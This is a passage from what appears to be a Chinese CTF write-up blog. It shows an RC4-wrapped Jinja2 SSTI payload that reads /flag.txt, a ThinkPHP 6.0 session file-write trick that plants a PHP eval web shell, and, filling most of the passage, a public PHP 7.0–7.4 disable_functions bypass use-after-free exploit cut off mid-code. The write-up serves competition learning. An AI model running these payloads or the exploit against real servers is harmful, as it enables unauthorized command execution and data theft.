class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s"</span> <span class="token operator">%</span>quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rc4_main<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">,</span><span class="token string">"&#123;&#123;lipsum.__globals__.__builtins__.eval(\"__import__('os').popen('cat /flag.txt').read()\")&#125;&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入喵喵喵</p>        <h2 id="GYCTF2020-EasyThinking"   >          <a href="#GYCTF2020-EasyThinking" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2>      <p>看这个题目怕不是ThinkPHP，随便搞一个不存在的目录，发现确实是ThinkPHP V6.0的一个session处任意文件写入漏洞</p><blockquote><p>大概就是在./runtime/session/目录下写入一个名为sess_SESSIONID的文件，内容是传入的参数内容</p></blockquote><p>那么在搜索处构造木马<code>&lt;?php eval($_POST[a]);?&gt;</code></p><p>然后访问<code>/runtime/session/sess_d62297dbd2f3523b5b66a5036c3f.php</code></p><p>ban了一堆函数，找<code>disable_functions</code>绕过poc</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><span class="token comment">#</span><span class="token comment"># Bug: https://bugs.php.net/bug.php?id=76047</span><span class="token comment"># debug_backtrace() returns a reference to a variable </span><span class="token comment"># that has been destroyed, causing a UAF vulnerability.</span><span class="token comment">#</span><span class="token comment"># This exploit should work on all PHP 7.0-7.4 versions</span><span class="token comment"># released as of 30/01/2020.</span><span class="token comment">#</span><span class="token comment"># Author: https://github.com/mm0r1</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">pwn</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># ;)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># PHP >= 7.4</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># PT_LOAD, PF_Read_Write</span>                <span class="token comment"># handle pie</span>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># PT_LOAD, PF_Read_exec</span>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment"># 'constant' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment"># 'bin2hex' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># ELF header</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># system</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment"># str_shuffle prevents opcache string interning</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment"># increase this value if UAF fails</span>    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># leaks</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token comment"># fake value</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment"># fake reference</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token 